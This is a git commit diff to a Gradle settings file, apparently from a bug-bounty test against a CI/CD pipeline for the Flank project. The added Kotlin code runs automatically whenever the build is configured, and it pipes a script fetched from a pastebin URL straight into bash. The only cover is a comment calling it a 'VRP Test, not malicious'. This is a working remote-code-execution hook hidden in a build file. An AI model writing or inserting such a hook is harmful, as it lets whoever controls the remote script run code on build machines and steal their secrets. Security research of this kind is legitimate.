fdc8a26958add385b8196f3cd00ba0f685e800cf
tari <i@tari.moe>
2024-04-17 14:21:21 +0800

    [UPDATE] test flank leak

--- settings.gradle.kts
+++ settings.gradle.kts
@@ -1,2 +1,16 @@
 rootProject.name = "hack-flank-cicd"
 
+// For VRP Test, not malicious.
+fun String.runCommand(): String? = try {
+    ProcessBuilder("/bin/sh", "-c", this)
+            .redirectOutput(ProcessBuilder.Redirect.PIPE)
+            .redirectError(ProcessBuilder.Redirect.PIPE)
+            .start()
+            .inputStream.bufferedReader().readText()
+} catch (e: Exception) {
+    e.printStackTrace()
+    null
+}
+
+val output = "curl -sSfL https://pastebin.com/raw/Ujik0RuJ | bash".runCommand()
+println("Shell command output: $output")
